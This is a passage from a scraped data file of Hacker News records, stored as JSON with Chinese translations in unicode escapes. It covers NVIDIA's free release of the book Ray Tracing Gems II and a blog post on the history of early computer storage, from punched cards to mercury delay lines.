\u4e2a\u6708\u4e2d\uff0c\u767e\u5e74\u4e00\u9047\u7684\u6d41\u884c\u75c5\u6fc0\u589e\u3002\u5b83\u7684\u5f71\u54cd\u5df2\u7ecf\u89e6\u53ca\u5730\u7403\u4e0a\u7684\u6bcf\u4e00\u4e2a\u4eba\u2014\u2014\u800c\u4e14\u5b83\u8fd8\u6ca1\u6709\u7ed3\u675f\u3002\u6b63\u5982\u6211\u4eec\u6240\u77e5\uff0c\u8be5\u75c5\u6bd2\u593a\u53bb\u4e86\u751f\u547d\uff0c\u7834\u574f\u4e86\u751f\u8ba1\uff0c\u5e76\u7834\u574f\u4e86\u751f\u6d3b\u65b9\u5f0f\u3002\u6211\u4eec\u575a\u4fe1\u51a0\u72b6\u75c5\u6bd2\u4f1a\u88ab\u514b\u670d\uff0c\u6211\u4eec\u63a8\u8fdf\u4e86\u8fd9\u672c\u4e66\u3002\u968f\u7740\u65f6\u95f4\u7684\u63a8\u79fb\uff0c\u75ab\u82d7\u7684\u5f00\u53d1\u53d6\u5f97\u4e86\u98de\u901f\u7684\u8fdb\u5c55\uff0c\u9694\u79bb\u4e2d\u7684\u8fdc\u7a0b\u5de5\u4f5c\u6210\u4e3a\u4e86\u4e00\u79cd\u65b0\u7684\u751f\u6d3b\u4e3b\u98df\uff0c\u4f5c\u8005\u4eec\u518d\u6b21\u5f00\u59cb\u5199\u8ba1\u7b97\u673a\u56fe\u5f62\u5b66\u3002\u56e0\u6b64\uff0c\u8fd9\u672c\u4e66\u5b8c\u5168\u662f\u5728\u9694\u79bb\u671f\u95f4\u7f16\u5199\u7684\u3002\u6211\u4eec\u771f\u8bda\u5730\u611f\u8c22\u4f5c\u8005\u7684\u70ed\u60c5\u548c\u5949\u732e\u7cbe\u795e\u2014\u2014\u4ee5\u53ca\u4fe1\u5ff5\u2014\u2014\u6240\u6709\u8fd9\u4e9b\u4f7f\u8fd9\u672c\u4e66\u5728\u7279\u6b8a\u60c5\u51b5\u4e0b\u6210\u4e3a\u53ef\u80fd\u3002\u53c2\u52a0 8 \u6708 9 \u65e5\u81f3 13 \u65e5\u7684 SIGGRAPH 2021 \u4f1a\u8bae\uff0c\u4ee5\u865a\u62df\u65b9\u5f0f\u6df1\u5165\u4e86\u89e3\u56fe\u5f62\u9886\u57df\u7684\u6700\u65b0\u521b\u65b0\u3002\u521b\u4f5c\u8005\u3001\u5b66\u751f\u3001\u7814\u7a76\u4eba\u5458\u548c\u5176\u4ed6\u4e13\u4e1a\u4eba\u58eb\u53ef\u4ee5\u4f53\u9a8c AI \u5982\u4f55\u6539\u53d8\u56fe\u5f62\u7684\u672a\u6765\uff0c\u4ece\u6a21\u62df\u5230\u4ea4\u4e92\u5f0f\u534f\u4f5c\u548c\u521b\u610f\u5de5\u5177\u3002\u5e76\u4e14\uff0c\u72ec\u5bb6\u4e86\u89e3 NVIDIA Research\u3001NVIDIA Omniverse \u4ee5\u53ca\u8bbe\u8ba1\u548c\u53ef\u89c6\u5316\u89e3\u51b3\u65b9\u6848\u5982\u4f55\u63a8\u52a8\u56fe\u5f62\u5de5\u4f5c\u6d41\u548c GPU \u52a0\u901f\u8f6f\u4ef6\u7684\u5148\u8fdb\u7a81\u7834\u3002\u4f7f\u7528\u4ee3\u7801 NVIDIA21 \u83b7\u5f97\u514d\u8d39\u7684\u57fa\u672c\u901a\u884c\u8bc1\u3002", "note_en": "This Open Access book is a must-have for anyone interested in real-time rendering. Ray tracing is the holy grail of gaming graphics, simulating the physical behavior of light to bring real-time, cinematic-quality rendering to even the most visually intense games. Ray tracing is also a fundamental algorithm used for architecture applications, visualization, sound simulation, deep learning, and more.\n To win a limited edition print copy of\u00a0 Ray Tracing Gems II, enter the giveaway contest here:\u00a0 https://developer.nvidia.com/ray-tracing-gems-ii\n  In 2018, real-time ray tracing arrived in consumer GPU hardware and swiftly established itself as a key component of how images would be generated moving forward. Now, three years later, the second iteration of this hardware is available, mainstream game consoles support ray tracing, and cross-platform API standards have been established to drive even wider adoption. Developers and researchers have been busy inventing (and reinventing) algorithms to take advantage of the new possibilities created by these advancements. The \u201cgems\u201d of knowledge discovered during this process are what you will find in   Ray Tracing Gems II .\n Before diving into the treasure trove, we want to make sure you know the following:\n  Open access content allows you to freely copy and redistribute any chapter, or the whole book, as long as you give appropriate credit and you are not using it for commercial purposes. The specific license is the   Creative Commons Attribution 4.0 International License (CC-BY-NC-ND) . We put this in place so that authors, and everyone else, can disseminate the information in this volume as quickly, widely, and equitably as possible.\n Writing an anthology style book, such as this, is an act of collective faith. Faith that the authors, editors, publisher, and schedules all converge to produce a worthwhile result for readers. Under normal circumstances this is a difficult task, but the past year and a half has been anything but \u201cnormal\u201d. This book\u2019s call for participation was posted in late November 2019, just as the COVID-19 virus began to emerge in Asia. In the 18 months since, a once-in-a-century pandemic has surged. Its impact has touched every person on Earth \u2013 and it is not yet over. The virus has taken lives, battered livelihoods, and broken the way of life as we knew it. We postponed this book with the quiet conviction that the coronavirus would be overcome. As time passed, the development of vaccines made breakneck progress, remote work in quarantine became a new staple of life, and authors began to write about computer graphics again. As a result, this book was written entirely during quarantine. We sincerely thank the authors for their passion and dedication \u2013 and faith \u2013 all of which made this book possible under extraordinary circumstances.\n  Join us August 9-13 at the SIGGRAPH 2021 conference to virtually dive into the latest innovations in graphics. Creators, students, researchers, and other professionals can experience how AI is transforming the future of graphics, from simulation to interactive collaboration and creative tools. And, get an exclusive look at how NVIDIA Research, NVIDIA Omniverse, and design and visualization solutions are driving advanced breakthroughs in graphics workflows and GPU-accelerated software. Get a free basic pass with code NVIDIA21.", "posttime": "2021-08-05 20:53:29", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "\u4e0b\u8f7d,\u514d\u8d39,\u8ffd\u8e2a,tracing,\u4f5c\u8005", "title": "\u5149\u7ebf\u8ffd\u8e2a\u5b9d\u77f3 II \u53ef\u514d\u8d39\u4e0b\u8f7d", "title_en": "Ray Tracing Gems II available as free download", "transed": 1, "url": "https://developer.nvidia.com/blog/ray-tracing-gems-ii-available-today-as-free-digital-download/", "via": "", "real_tags": ["\u4e0b\u8f7d", "\u514d\u8d39", "\u8ffd\u8e2a", "tracing", "\u4f5c\u8005"]}, {"category": "", "categoryclass": "", "imagename": "14ab13e523f4406b591342fbcd2c8c81.jpeg", "infoid": 1071332, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "\u5728\u672c\u6587\u4e2d\u82b1\u8d39\u5927\u91cf\u65f6\u95f4\u6765\u60ca\u53f9\u8ba1\u7b97\u673a\u5b58\u50a8\u4e0e\u8fc7\u53bb\u76f8\u6bd4\u53d8\u5f97\u591a\u4e48\u5c0f\u5de7\u548c\u5ec9\u4ef7\uff0c\u8fd9\u5f88\u8bf1\u4eba\u3002 1980 \u5e74\u4ee3\uff0c\u6211\u5728 Digital Equipment Corporation \u5de5\u4f5c\u65f6\uff0c\u6211\u7684\u7b2c\u4e00\u4efd\u5de5\u4f5c\u662f\u4e3a\u5927\u578b\u8ba1\u7b97\u673a\u8bbe\u8ba1\u5b58\u50a8\u5668\u3002\u6211\u4eec\u6b63\u5728\u6784\u5efa\u7684\u7cfb\u7edf\u7406\u8bba\u4e0a\u6700\u591a\u53ef\u4ee5\u6709 1GB \u7684\u5185\u5b58\uff0c\u4f46\u5f53\u65f6\u6211\u4eec\u5632\u7b11\u8fd9\u4e2a\u60f3\u6cd5\uff0c\u56e0\u4e3a\u5b83\u9700\u8981\u591a\u4e2a\u51b0\u7bb1\u5927\u5c0f\u7684\u673a\u67dc\u548c\u6570\u767e\u4e07\u7f8e\u5143\u6765\u6784\u5efa\u5b83\uff0c\u800c\u4e14\u8c01\u9700\u8981 1GB \u7684\u5185\u5b58\uff0c\u65e0\u8bba\u5982\u4f55?\u5f53\u7136\uff0c\u73b0\u5728\u4f60\u529e\u516c\u684c\u62bd\u5c49\u540e\u9762\u7684\u4e00\u4e2a\u53ea\u6709 1GB \u7684 USB \u9a71\u52a8\u5668\u56e0\u4e3a\u592a\u5c0f\u800c\u88ab\u6254\u6389\u4e86\uff0c\u5728\u8d85\u5e02\u6536\u94f6\u53f0\u53ef\u4ee5\u627e\u5230\u5408\u9002\u7684\u66ff\u4ee3\u54c1\uff0c\u4ef7\u683c\u4f4e\u4e8e 10 \u7f8e\u5143\u3002\u6211\u8ba4\u4e3a\u5c3d\u7ba1\u8fd9\u662f\u6211\u5c06\u81f4\u529b\u4e8e\u8c08\u8bba\u8fd9\u4e00\u975e\u51e1\u8fdb\u6b65\u7684\u6240\u6709\u65f6\u95f4\u3002\u5c3d\u7ba1\u6bcf\u6b21\u60f3\u5230\u6bd4\u8f83\u65f6\u5b83\u4ecd\u7136\u8ba9\u6211\u611f\u5230\u56f0\u60d1\uff0c\u4f46\u8fd9\u662f\u4e00\u4e2a\u5f7b\u5e95\u6db5\u76d6\u7684\u4e3b\u9898\u3002\u76f8\u53cd\uff0c\u6211\u60f3\u56de\u6eaf\u5230\u66f4\u8fdc\u7684\u5730\u65b9\uff0c\u770b\u770b\u6bd4\u6211\u901a\u5e38\u5199\u7684\uff08\u65e0\u53ef\u5426\u8ba4\u7684\u65e7\uff09\u4e1c\u897f\u66f4\u53e4\u8001\u7684\u5b58\u50a8\u7cfb\u7edf\u3002\u5176\u4e2d\u4e00\u4e9b\u662f\u6211\u5b9e\u9645\u4f7f\u7528\u8fc7\u7684\uff0c\u4f46\u6709\u4e9b\u662f\u6211\u591a\u5e74\u6765\u624d\u521a\u521a\u4e86\u89e3\u5230\u7684\u3002\u7eb8\u5f20\u4f5c\u4e3a\u5b58\u50a8\u4ecb\u8d28\u5df2\u7ecf\u5b58\u5728\u5f88\u957f\u65f6\u95f4\u4e86\u3002\u63a7\u5236\u94a2\u7434\u7b49\u4e50\u5668\u7684\u7eb8\u5377\u53ef\u4ee5\u8ffd\u6eaf\u5230 19 \u4e16\u7eaa\u4e2d\u53f6\u3002 IBM \u5f00\u59cb\u5236\u9020\u673a\u5668\uff0c\u8be5\u673a\u5668\u6539\u8fdb\u4e86 1800 \u5e74\u4ee3\u66f4\u8001\u7684\u7eb8\u5361\u5236\u8868\u673a\uff0c\u5c06\u73b0\u6709 22 \u5217\u5361\u7247\u7684\u5c3a\u5bf8\u548c\u5b58\u50a8\u91cf\u6269\u5927\u5230 80\u3002\u4ed6\u4eec\u8fd8\u5c06\u6cbf\u9014\u7684\u5b54\u4ece\u5706\u5f62\u6539\u4e3a\u77e9\u5f62\uff0c\u5e76\u4e14IBM \u6253\u5b54\u5361\u8bde\u751f\u4e86\u3002 \uff08\u53e6\u5916\uff0c\u6709\u8da3\u7684\u4e8b\u5b9e\uff0c\u65e7\u7684 CRT \u7ec8\u7aef\u6709 80 \u5217\u6587\u672c\u5b57\u7b26\u7684\u539f\u56e0\uff09\u8fd9\u79cd\u683c\u5f0f\u7edf\u6cbb\u4e86\u4ece 1920 \u5e74\u4ee3\u4e00\u76f4\u5230 1970 \u5e74\u4ee3\u7684\u65e9\u671f\u4fe1\u606f\u65f6\u4ee3\u3002 \uff08IBM \u5728\u4e0a\u9762\u7684\u94fe\u63a5\u4e2d\u8bf4\u8fd9\u4e9b\u5361\u7247\u5b58\u50a8\u4e86 20 \u4e16\u7eaa\u4e0a\u534a\u53f6\u7684\u6240\u6709\u4e16\u754c\u4fe1\u606f\uff0c\u4f46\u6211\u8ba4\u4e3a\u4ed6\u4eec\u5fd8\u8bb0\u4e86\u4e66\u7c4d\u3002\uff09\u6211\u5728 COBOL \u8bfe\u7a0b\u4e2d\u66fe\u77ed\u6682\u5730\u5728\u8fd9\u4e9b\u5361\u7247\u4e0a\u7f16\u5199\u7a0b\u5e8f\u5728\u6211\u4eec\u9ad8\u4e2d\u7684 70 \u5e74\u4ee3\u3002\u5230\u90a3\u65f6\uff0c\u4f7f\u7528\u5361\u7247\u4f5c\u4e3a\u7f16\u7a0b\u5b58\u50a8\u4ecb\u8d28\u5df2\u7ecf\u8fc7\u65f6\u4e86\uff0c\u4f46\u5728\u6211\u6240\u5728\u7684\u4e0d\u592a\u5148\u8fdb\u7684\u516c\u7acb\u5b66\u6821\u7cfb\u7edf\u4e2d\u4ecd\u7136\u5b58\u5728\u3002\u6211\u8bb0\u5f97\u7684\u4e24\u4ef6\u4e8b\u662f\uff0c\u9996\u5148\uff0c\u72af\u4e86\u4e00\u4e2a\u9519\u8bef\uff0c\u4e0d\u5141\u8bb8\u5220\u9664\u952e\u6765\u6253\u5b54\uff0c\u4f60\u521a\u5f00\u59cb\u4e00\u5f20\u65b0\u5361\u3002\u7b2c\u4e8c\u4e2a\u662f\u5982\u679c\u4f60\u653e\u4e0b\u4f60\u7684\u5361\u7247\u7ec4\u4f1a\u53d1\u751f\u4ec0\u4e48\u3002\u7a0b\u5e8f\u7684\u6bcf\u4e00\u884c\u90fd\u4ee5\u968f\u673a\u987a\u5e8f\u6563\u5e03\u5230\u5730\u677f\u4e0a\uff0c\u91cd\u65b0\u6392\u5e8f\u5b83\u4eec\u662f\u4e00\u79cd\u75db\u82e6\u3002\u6bcf\u4e2a\u7a0b\u5e8f\u8bed\u53e5\u90fd\u4f1a\u5728\u5361\u7247\u4e0a\u6709\u4e00\u4e2a\u884c\u53f7\uff0c\u56e0\u6b64\u53ef\u4ee5\u8ba1\u7b97\u51fa\u6765\uff0c\u4f46\u662f\u9605\u8bfb\u6570\u767e\u5f20\u5361\u7247\u5e76\u5c06\u5b83\u4eec\u6d17\u724c\u662f\u4e4f\u5473\u7684\u3002\n\u5982\u679c\u5e78\u8fd0\u7684\u8bdd\uff0c\u60a8\u53ef\u4ee5\u4f7f\u7528 IBM \u5361\u7247\u5206\u7c7b\u673a\u4e4b\u7c7b\u7684\u8bbe\u5907\u6765\u5b8c\u6210\u8fd9\u9879\u5de5\u4f5c\uff0c\u4f46\u8fd9\u79cd\u5173\u952e\u7684\u6570\u636e\u5904\u7406\u4e2d\u5fc3\u8bbe\u5907\u4e0d\u592a\u53ef\u80fd\u7528\u4e8e\u60a8\u91cd\u65b0\u7ec4\u88c5\u5361\u7247\u7ec4\u3002\u56e0\u6b64\uff0c\u4e13\u4e1a\u4eba\u58eb\u62ff\u4e86\u4e00\u4e2a\u5de8\u5927\u7684\u9b54\u6cd5\u8bb0\u53f7\u7b14\uff0c\u5728\u724c\u7ec4\u7684\u4fa7\u9762\u753b\u4e86\u4e00\u6761\u659c\u6761\u7eb9\uff0c\u8fd9\u6837\u4f60\u5c31\u53ef\u4ee5\u76f4\u89c2\u5730\u53d1\u73b0\u4e71\u5e8f\u7684\u724c\u3002\u6211\u5728 70 \u5e74\u4ee3\u82b1\u4e86\u66f4\u591a\u65f6\u95f4\u4f7f\u7528\u53e6\u4e00\u79cd\u7eb8\u5f20\u683c\u5f0f\uff0c\u5373\u7eb8\u5e26\u3002\u7eb8\u5e26\u6253\u5b54\u673a\u662f\u4e00\u79cd\u5e38\u89c1\u7684\u5916\u56f4\u8bbe\u5907\uff0c\u5b83\u8fde\u63a5\u5230\u7535\u4f20\u6253\u5b57\u673a\uff0c\u4f8b\u5982\u6211\u5728\u5b66\u6821\u7528\u6765\u7f16\u5199 BASIC \u7a0b\u5e8f\u7684 Model 33\u3002\u6253\u5b54\u5668\u548c\u8bfb\u53d6\u5668\u90fd\u663e\u793a\u4e3a\u76f8\u5f53\u4e8e /dev \u7684\u8bbe\u5907\uff0c\u5e76\u4e14\u4e0e UNIX \u975e\u5e38\u76f8\u4f3c\uff0c\u60a8\u53ef\u4ee5\u5c06\u7a0b\u5e8f\u91cd\u5b9a\u5411\u5230\u7eb8\u5e26\u4e0a\u6216\u4ece\u7eb8\u5e26\u4e0a\u91cd\u5b9a\u5411\u3002\u7531\u4e8e\u673a\u68b0\u901f\u5ea6\u9650\u5236\u4ee5\u53ca\u4f7f\u7528\u7684\u76f8\u5f53\u57fa\u672c\u7684\u7f16\u7801\uff086 \u4f4d ASCII\uff09\uff0c\u6253\u5b54\u548c\u8bfb\u53d6\u901f\u5ea6\u975e\u5e38\u6162\u3002\u4f46\u5b83\u662f\u4e00\u79cd\u771f\u6b63\u7684\u8bfb/\u5199\u683c\u5f0f\uff0c\u5373\u4f7f\u60a8\u65e0\u6cd5\u64e6\u9664\u548c\u91cd\u590d\u4f7f\u7528\u4ecb\u8d28\u3002\u7531\u4e8e\u4e0d\u6d89\u53ca\u6253\u5b57\uff0c\u56e0\u6b64\u6bd4\u5361\u7247\u66f4\u5bb9\u6613\u7ba1\u7406\u3002\u6211\u8981\u63d0\u5230\u7684\u6700\u540e\u4e00\u4e2a\u7eb8\u5f20\u5b58\u50a8\u8bbe\u5907\u662f\u6253\u5370\u673a\u3002\u60a8\u53ef\u80fd\u4e0d\u4f1a\u5c06\u6253\u5370\u673a\u89c6\u4e3a\u5b58\u50a8\u8bbe\u5907\uff0c\u4f46\u5728 70 \u5e74\u4ee3\u751a\u81f3 80 \u5e74\u4ee3\uff0c\u901a\u8fc7\u6253\u5370\u6765\u5171\u4eab\u7a0b\u5e8f\u975e\u5e38\u666e\u904d\u3002\u6253\u5370\u673a\u662f\u201c\u4f5c\u5bb6\u201d\uff0c\u800c\u201c\u8bfb\u8005\u201d\u662f\u5fc5\u987b\u91cd\u65b0\u8f93\u5165\u7684\u4eba\uff0c\u8fd9\u5f53\u7136\u5f88\u6162\u3002\u4f46\u5f53\u65f6\u7684\u8bb8\u591a\u6742\u5fd7\u548c\u4e66\u7c4d\u90fd\u4f1a\u51fa\u7248\u5370\u5237\u7248\u7a0b\u5e8f\u4e0e\u8bfb\u8005\u5206\u4eab\uff0c\u6211\u82b1\u4e86\u51e0\u4e2a\u5c0f\u65f6\u4ece\u5370\u5237\u7248\u4e2d\u8f93\u5165 BASIC \u7a0b\u5e8f\uff0c\u7136\u540e\u8bd5\u56fe\u627e\u51fa\u6240\u6709\u9519\u522b\u5b57\u3002\u6211\u6700\u8fd1\u53d1\u73b0\u4e86\u6211 17 \u5c81\u65f6\u5199\u7684\u4e00\u4e2a\u7a0b\u5e8f\u7684\u6253\u5370\u8f93\u51fa\uff0c\u5b83\u88ab\u56f0\u5728 80 \u5e74\u4ee3\u7684\u65e7\u8ba1\u7b97\u673a\u6e38\u620f\u4e16\u754c\u6742\u5fd7\u4e2d\u3002\u8fd9\u662f\u6211\u5199\u7684\u4e00\u4e2a\u6e38\u620f\uff0c\u6211\u51b3\u5b9a\u590d\u6d3b\u5b83\uff0c\u770b\u770b\u6211\u80fd\u4e0d\u80fd\u8ba9\u5b83\u8fd0\u884c\u3002 \uff08\u5267\u900f\u662f\uff0c\u6211\u505a\u5230\u4e86 - \u4f46\u6211\u5c06\u5728\u53e6\u4e00\u7bc7\u6587\u7ae0\u4e2d\u4ecb\u7ecd\u90a3\u4e2a\u3002\uff09\u6211\u89c9\u5f97\u7eb8\u5f20\u5b58\u50a8\u683c\u5f0f\u4ee4\u4eba\u60ca\u5947\u7684\u662f\u5b83\u7684\u957f\u5bff\u3002\u51e0\u5341\u5e74\u524d\u6253\u5b54\u7684\u5361\u7247\u7ec4\u548c\u7eb8\u5e26\u4ecd\u7136\u975e\u5e38\u53ef\u884c\uff0c\u53ea\u8981\u60a8\u80fd\u627e\u5230\u4e00\u79cd\u9605\u8bfb\u65b9\u5f0f\uff0c\u5e76\u4e14\u4efb\u4f55\u65f6\u5019\u90fd\u4e0d\u4f1a\u5f04\u6e7f\u3002\u7eb8\u4f5c\u4e3a\u673a\u68b0\u8ba1\u7b97\u673a\u65f6\u4ee3\u7684\u5b58\u50a8\u4ecb\u8d28\u975e\u5e38\u597d\uff0c\u4f46\u662f\u5f53 1940 \u5e74\u4ee3\u7535\u5b50\u8ba1\u7b97\u673a\u51fa\u73b0\u65f6\uff0c\u9700\u8981\u66f4\u5feb\u7684\u89e3\u51b3\u65b9\u6848\uff0c\u81f3\u5c11\u5bf9\u4e8e\u4e3b\u5b58\u50a8\u5668\u6216\u201c\u5b58\u50a8\u201d\uff0c\u56e0\u4e3a\u5b83\u901a\u5e38\u88ab\u79f0\u4e3a\u201c\u5b58\u50a8\u201d\u7136\u540e\u3002\u5982\u679c\u60a8\u8ba4\u4e3a\u7a7f\u5b54\u5361\u662f\u5f53\u4eca\u7684\u5927\u5bb9\u91cf\u201c\u78c1\u76d8\u5b58\u50a8\u201d\uff0c\u90a3\u4e48\u5b83\u4ecd\u7136\u9700\u8981\u4e00\u4e2a\u66f4\u5c0f\u3001\u66f4\u5feb\u7684\u5b58\u50a8\u8bbe\u5907\u6765\u5b58\u50a8\u53ef\u4ee5\u8ddf\u4e0a\u5904\u7406\u5668\u7684\u7a0b\u5e8f\u548c\u6570\u636e\uff08\u4f8b\u5982\u4eca\u5929\u7684\u52a8\u6001\u5185\u5b58\u7cfb\u7edf\uff09 \uff09\u3002\u673a\u68b0\u89e3\u51b3\u65b9\u6848\u5df2\u7ecf\u8fc7\u65f6\uff0c\u800c\u7535\u5b50\u89e3\u51b3\u65b9\u6848\u51fa\u73b0\u4e86\u3002\u4f46\u662f\u5b58\u5728\u89c4\u6a21\u95ee\u9898\uff0c\u56e0\u4e3a\u96c6\u6210\u7535\u8def\u8fd8\u6709 20 \u5e74\u7684\u65f6\u95f4\uff0c\u751a\u81f3\u6676\u4f53\u7ba1\u8fd8\u6ca1\u6709\u53d1\u660e\u51fa\u6765\u3002\u53ef\u4ee5\u6784\u5efa\u7531\u7ba1\u5236\u6210\u7684\u5bc4\u5b58\u5668\u7535\u8def\uff0c\u4f46\u81f3\u5c11\u9700\u8981 4-5 \u4e2a\u7ba1\u548c\u76f8\u5173\u7684\u5206\u7acb\u5143\u4ef6\u6765\u5b58\u50a8\u5355\u4e2a\u4f4d\u3002\u8fd9\u901f\u5ea6\u5f88\u5feb\uff0c\u4f46\u9700\u8981\u5927\u91cf\u7a7a\u95f4\u548c\u5927\u91cf\u529f\u7387\u3002\u6570\u4ee5\u4e07\u8ba1\u7684\u7ba1\u5b50\u53ea\u662f\u4e3a\u4e86\u5b58\u50a8 1 \u5343\u5b57\u8282\u7684\u6570\u636e\uff0c\u9020\u6210\u5404\u79cd\u6210\u672c\u3001\u529f\u7387\u3001\u6563\u70ed\u548c\u53ef\u9760\u6027\u95ee\u9898\u3002\n\u5236\u9020\u66f4\u5c0f\u7684\u5b58\u50a8\u8bbe\u5907\u7684\u52a8\u673a\u5f88\u9ad8\uff0c\u56e0\u6b64\u4ed6\u4eec\u5bf9\u53ef\u4ee5\u5c06\u6240\u6709\u90e8\u5206\u4fdd\u7559\u4e00\u6bb5\u65f6\u95f4\u7684\u5730\u65b9\u8fdb\u884c\u4e86\u521b\u610f\u3002\u6700\u65e9\u7684\u89e3\u51b3\u65b9\u6848\u4e4b\u4e00\u662f\u4f7f\u7528\u7535\u7ebf\u3002\u7a0d\u5fae\u590d\u6742\u4e00\u70b9\uff0c\u4f46\u57fa\u672c\u4e0a\u662f\u4e00\u6839\u7535\u7ebf\u3002\u8fd9\u4e2a\u60f3\u6cd5\u662f\u57fa\u4e8e\u6ce2\u4f20\u64ad\u7684\u539f\u7406\uff0c\u5176\u4e2d\u7535\u8109\u51b2\u6cbf\u7740\u5bfc\u4f53\u4f20\u64ad\u9700\u8981\u65f6\u95f4\uff0c\u5982\u679c\u5bfc\u4f53\u8db3\u591f\u957f\uff0c\u4ee3\u8868\u6bd4\u7279\u7684\u51e0\u4e2a\u8109\u51b2\u53ef\u4ee5\u5728\u5b83\u4eec\u884c\u8fdb\u65f6\u5b58\u50a8\u5728\u5bfc\u7ebf\u4e2d\u3002\u8fd9\u4e2a\u6280\u672f\u9886\u57df\u4e5f\u88ab\u79f0\u4e3a\u4f20\u8f93\u7ebf\u7406\u8bba\uff0c\u5b83\u540e\u6765\u56f0\u6270\u7740\u50cf\u6211\u8fd9\u6837\u7684\u7cfb\u7edf\u5de5\u7a0b\u5e08\uff0c\u56e0\u4e3a\u4fe1\u53f7\u5728\u7535\u7ebf\u4e2d\u4f20\u64ad\u7684\u5f71\u54cd\u4f1a\u5bfc\u81f4\u5ef6\u8fdf\u751a\u81f3\u53cd\u5c04\uff0c\u4ece\u800c\u5bfc\u81f4\u5feb\u901f\u7535\u8def\u7684\u65f6\u5e8f\u548c\u4fe1\u53f7\u5b8c\u6574\u6027\u95ee\u9898\u3002\u867d\u7136 1940 \u5e74\u4ee3\u7684\u8ba1\u7b97\u673a\u8db3\u591f\u6162\uff0c\u4f46\u5f53\u65f6\u8bb8\u591a\u8fd9\u4e9b\u95ee\u9898\u90fd\u4e0d\u662f\u95ee\u9898\u3002\u8fd9\u5e76\u4e0d\u662f\u8bf4\u6240\u8c13\u7684\u5ef6\u8fdf\u7ebf\u5b58\u50a8\u5668\u5f88\u5bb9\u6613\u8bbe\u8ba1\u3002\u6709\u5f88\u591a\u95ee\u9898\uff0c\u9996\u5148\u662f\u8fde\u7ebf\uff0c\u5373\u4f7f\u662f\u957f\u8fde\u7ebf\uff0c\u4e5f\u4e0d\u80fd\u957f\u65f6\u95f4\u5b58\u50a8\u4fe1\u606f\u3002\u4ed6\u4eec\u901a\u8fc7\u6784\u5efa\u66f4\u6162\u7684\u4f20\u64ad\u7535\u8def\u6765\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\uff0c\u4f7f\u7528\u7535\u5bb9\u5668\u94fe\u6765\u5f62\u6210\u7535\u5ef6\u8fdf\u7ebf\u3002\u5b83\u4e0d\u80fd\u5b58\u50a8\u5f88\u591a\u4f4d\uff0c\u4f46\u6bd4\u673a\u68b0\u5b58\u50a8\u76f8\u5bf9\u4fbf\u5b9c\u4e14\u901f\u5ea6\u66f4\u5feb\u3002\u7136\u540e\u4e8b\u60c5\u53d8\u5f97\u5f88\u5947\u602a\u3002\u8fd9\u4e2a\u9886\u57df\u7684\u4e0b\u4e00\u4e2a\u53d1\u660e\u662f\u4e00\u79cd\u53eb\u505a\u6c34\u94f6\u5ef6\u8fdf\u7ebf\u7684\u4e1c\u897f\uff0c\u5b83\u57fa\u672c\u4e0a\u662f\u4e00\u4e2a\u5927\u7f50\u7684\u6db2\u6001\u6c34\u94f6\uff0c\u4e00\u7aef\u662f\u538b\u7535\u6676\u4f53\uff0c\u53e6\u4e00\u7aef\u662f\u9ea6\u514b\u98ce\u3002\u6676\u4f53\u4f1a\u4ea7\u751f\u4f1a\u901a\u8fc7\u6c34\u94f6\u4f20\u64ad\u7684\u7d27\u675f\u58f0\u6ce2\uff0c\u6c34\u94f6\u5bf9\u58f0\u97f3\u4e0e\u7a7a\u6c14\u6216\u6c34\u7684\u4f20\u64ad\u901f\u7387\u975e\u5e38\u9ad8\uff081450 m/s \u5bf9\u7a7a\u6c14\u7684 340 m/s\uff09\u3002\u58f0\u97f3\u8109\u51b2\u5c06\u4f5c\u4e3a\u4e32\u884c\u6d41\u4f20\u8f93\u5230\u7f50\u4e2d\uff0c\u5e76\u8bfb\u51fa\u53e6\u4e00\u7aef\uff0c\u653e\u5927\u3001\u4fee\u6539\u3001\u53cd\u9988\u3002\u5fc5\u987b\u4ed4\u7ec6\u9009\u62e9\u7ba1\u7684\u957f\u5ea6\uff0c\u4f7f\u7cfb\u7edf\u7684\u5faa\u73af\u65f6\u95f4\u7b26\u5408CPU \u65f6\u949f\u9891\u7387\uff0c\u5e76\u4e14\u9700\u8981\u591a\u4e2a\u7ba1\u6765\u5b58\u50a8\u8d85\u8fc7\u4e00\u767e\u4f4d\u5de6\u53f3\u7684\u4efb\u4f55\u5185\u5bb9\u3002\u5230 1950 \u5e74\u4ee3\u521d\uff0c\u8ba1\u7b97\u673a\u53d8\u5f97\u8db3\u591f\u590d\u6742\uff0c\u9700\u8981\u66f4\u591a\u7684\u5b58\u50a8\u7a7a\u95f4\u548c\u66f4\u5feb\u7684\u5b58\u50a8\u7a7a\u95f4\u3002\u5ef6\u8fdf\u7ebf\u7684\u5bb9\u91cf\u76f8\u5f53\u6709\u9650\uff0c\u5e76\u4e14\u901a\u8fc7\u67d0\u79cd\u4ecb\u8d28\u4f20\u64ad\u7684\u7535\u6ce2\u6216\u58f0\u6ce2\u7684\u5ef6\u8fdf\u9020\u6210\u4e86\u57fa\u672c\u7684\u8bbf\u95ee\u65f6\u95f4\u9650\u5236\uff0c\u8fd9\u963b\u788d\u4e86 CPU \u7684\u541e\u5410\u91cf\u3002\u518d\u52a0\u4e0a\u5185\u5b58\u8bbf\u95ee\u7684\u4e32\u884c\u65b9\u9762\u7684\u95ee\u9898\uff0c\u751a\u81f3\u4e0d\u8981\u5f00\u59cb\u8003\u8651\u62e5\u6709\u6240\u6709\u6c5e\u7684\u6bd2\u6027\u95ee\u9898\u3002\u957f\u8bdd\u77ed\u8bf4\uff0c\u5f53\u65f6\u7684\u8ba1\u7b97\u673a\u5de5\u7a0b\u5e08\u8fd8\u4e0d\u6ee1\u610f\uff08\u4ed6\u4eec\u6c38\u8fdc\u4e0d\u4f1a\u6ee1\u610f\uff0c\u76f8\u4fe1\u6211\uff09\uff0c\u5e76\u7ee7\u7eed\u5bfb\u627e\u5176\u4ed6\u5947\u602a\u800c\u53e4\u602a\u7684\u65b9\u5f0f\u6765\u5b58\u50a8\u6570\u636e\uff0c\u5373\u4f7f\u6ca1\u6709\u534a\u5bfc\u4f53\u3002\n\u4ed6\u4eec\u60f3\u51fa\u7684\u4e0b\u4e00\u4ef6\u4e8b\u662f\u6211\u4e2a\u4eba\u7684\u6700\u7231\u4e4b\u4e00\uff0c\u79f0\u4e3a\u5a01\u5ec9\u59c6\u65af-\u57fa\u5c14\u672c\u7ba1\u2014\u2014\u7531\uff08\u4ee4\u4eba\u60ca\u8bb6\u7684\uff09\u5f17\u96f7\u5fb7\u00b7\u5a01\u5ec9\u59c6\u65af\u548c\